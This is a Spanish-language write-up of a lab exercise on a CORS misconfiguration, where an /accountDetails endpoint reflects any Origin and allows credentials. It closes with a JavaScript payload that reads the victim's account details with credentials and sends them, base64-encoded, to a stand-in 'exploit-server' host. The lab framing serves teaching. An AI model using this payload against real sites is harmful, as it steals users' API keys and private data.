El laboratorio plantea un escenario en el que un endpoint sensible (/accountDetails) devuelve información privada —como la clave API del usuario— y permite solicitudes de origen cruzado reflejando el valor de la cabecera Origin. Esto significa que el servidor confía ciegamente en cualquier origen que le envíe una solicitud, siempre y cuando también devuelva la cabecera Access-Control-Allow-Credentials: true, lo que permite el envío de cookies junto con la petición.

La clase demuestra cómo el atacante puede aprovechar esta configuración desde un servidor malicioso (el exploit server) para realizar una petición XMLHttpRequest al dominio objetivo usando ‘**withCredentials: true**‘. Al no haber un filtrado adecuado en el backend, el servidor refleja el origen del atacante como válido y responde con los datos sensibles. El código JavaScript malicioso lee la respuesta y redirige al atacante a una URL de registro con la clave extraída como parámetro.

Con esta técnica, el atacante puede robar información del administrador sin necesidad de inyecciones en el servidor víctima, simplemente manipulando la política de intercambio de recursos entre dominios que ha sido mal configurada

Ya con la comprobación inicial realizada, nos centramos ahora en desplegar el exploit en el servidor de ataque. El objetivo es automatizar el robo de la clave de API mediante una petición ‘**XMLHttpRequest**‘ con credenciales activadas (**withCredentials**). Si el origen malicioso es reflejado en la respuesta como válido, y se permite el acceso a la respuesta gracias al encabezado ‘**Access-Control-Allow-Origin**‘, el navegador de la víctima nos dejará leer los datos sensibles y redirigirlos al log del exploit server.

Este enfoque demuestra cómo una validación incorrecta del origen puede dejar expuestos endpoints sensibles incluso cuando se ha intentado limitar el acceso con mecanismos CORS mal implementados.

----

Que es CORS?

En la respuesta de la peticion vemos la siguiente cabecera:

    Access-Control-Allow-Credentials: true

Si enviamos en la peticion una cabecera, es posible ver lo siguiente:

    Origin: test.com

En la respuesta se ve esto:

    Access-Control-Allow-Origin: test.com
    Access-Control-Allow-Credentials: true

Quiere decir que cualquier Origin será valido, ahora podemos cambiar interformacion entre la aplicacion y un servidor atacante, porque nos puede arrastrar cookies de sesion, para ello hacemos lo siguiente:

```javascript
<script>
    var req = new XMLHttpRequest();
    req.onload = function(){
        location = "https://exploit-server/?apikey= " + btoa(req.responseText);
    };
    req.open('GET','https://burpsuite/accountDetails',true);
    req.withCredentials = true; 
    req.send();

</script>


```
    



